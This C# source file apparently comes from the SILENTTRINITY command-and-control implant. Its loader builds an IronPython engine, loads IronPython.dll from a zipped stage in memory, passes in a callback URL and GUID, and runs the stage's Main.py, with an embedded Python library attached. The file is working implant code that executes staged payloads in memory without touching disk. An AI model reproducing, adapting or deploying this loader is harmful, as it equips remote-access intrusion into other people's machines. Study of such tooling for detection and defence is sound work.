using System;
using System.Reflection;
using IronPython.Hosting;
using IronPython.Modules;
using System.Linq;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.IO.Compression;
using Microsoft.Scripting.Hosting;

namespace SILENTTRINITY.Utilities
{
    public static class Engines
    {
        public static class IronPython
        {
            public static void Run(Uri url, Guid GUID, ZipStorer Stage)
            {
                var engine = Engines.IronPython.CreateEngine();

                using (MemoryStream engineStream = new MemoryStream())
                {
                    engine.Runtime.IO.SetOutput(engineStream, Encoding.UTF8);
                    engine.Runtime.IO.SetErrorOutput(engineStream, Encoding.UTF8);

                    var scope = engine.CreateScope();

                    scope.SetVariable("URL", url);
                    scope.SetVariable("GUID", GUID);
                    scope.SetVariable("IronPythonDLL",
                        Assembly.Load(Internals.GetResourceInZip(Stage, 
                                      "IronPython.dll"))
                        );
#if DEBUG
                    scope.SetVariable("DEBUG", true);
#elif RELEASE
                    scope.SetVariable("DEBUG", false);
#endif
                    byte[] mainPyFile = Internals.GetResourceInZip(Stage, "Main.py");
                     engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);
                }
            }

            // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
            // http://ironpython.net/blog/2012/07/07/whats-new-in-ironpython-273.html
            // https://blog.adamfurmanek.pl/2017/10/14/sqlxd-part-22/
            public static dynamic CreateEngine()
            {
                ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(
                                                new Dictionary<string, object>
                                                    {
                                                        ["Debug"] = false
                                                    });
                var pyRuntime = new ScriptRuntime(setup);
                ScriptEngine engineInstance = Python.GetEngine(pyRuntime);
                AddPythonLibrariesToSysMetaPath(engineInstance);
                return engineInstance;
            }

            public static void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
            {
                Assembly asm = Assembly.GetExecutingAssembly().GetType().Assembly;

                try
                {
                    var resQuery = from name in asm.GetManifestResourceNames()
                        where name.EndsWith(".zip", StringComparison.OrdinalIgnoreCase)
                            select name;
                    string resName = resQuery.Single();
#if DEBUG
                    Console.WriteLine("\t[+] Found embedded IPY stdlib: {0}", resName);
#endif
                    var importer = new ResourceMetaPathImporter(asm, resName);
                    dynamic sys = engineInstance.GetSysModule();

                    sys.meta_path.append(importer);
                    sys.path.append(importer);
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("\t[-] Did not find IPY stdlib in embedded resources: {0}", e.Message);
#endif
                    return;
                }
            }
        }
    }
}
